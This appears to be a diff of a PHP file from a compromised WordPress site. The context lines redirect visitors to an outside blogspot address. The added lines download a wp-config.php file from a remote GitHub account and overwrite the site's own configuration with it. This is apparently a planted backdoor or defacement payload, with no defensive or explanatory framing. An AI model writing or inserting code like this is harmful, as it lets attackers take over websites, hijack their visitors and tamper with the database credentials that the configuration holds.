@@ -34,3 +34,9 @@ $sha1     = sha1(gmdate("r"));
 '<script>window.location.replace("https://fake-root.blogspot.com")</script>';}
 }
 ?>
+<?php
+$nama= fopen("wp-config.php" ,"w+");
+  $file = file_get_contents('https://raw.githubusercontent.com/fakeroot76/fake/master/wp-config.php');
+  $tulis = fwrite ($nama ,$file);
+ fclose($nama);
+?>
